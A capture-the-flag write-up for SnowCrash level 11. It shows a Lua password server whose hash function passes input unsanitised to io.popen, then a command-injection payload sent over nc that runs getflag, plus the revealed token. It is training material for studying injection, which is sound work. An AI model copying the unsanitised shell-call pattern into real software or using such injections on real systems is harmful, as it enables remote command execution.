# Level 11

Level 11 we the following lua script 

```lua
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

it creates a simple server that listens on IP address "127.0.0.1" and port 5151 and prompts connected clients for a password then hashes the provided password and checks if the hash matches a specific value. If the hash matches, it sends a success message; otherwise, it sends a failure message.

Upon analysis of the code we noticed that the hash function doesn't sanitize the password input, and directly inserts it in the command `echo "..pass.." | sha1sum", "r"` which is executed by the `io.popen()` function. This allows us to inject commands in the password input and execute them on the server.

```lua
function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end
```

so all we need to do is close the argument string with a double quote and inject our command, let's try to get the token file:

```bash
level11@SnowCrash:~$ nc 127.0.0.1 5151
Password: \"; getflag > /tmp/hh
Erf nope..
level11@SnowCrash:~$ cat /tmp/hh
Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
level11@SnowCrash:~$
```
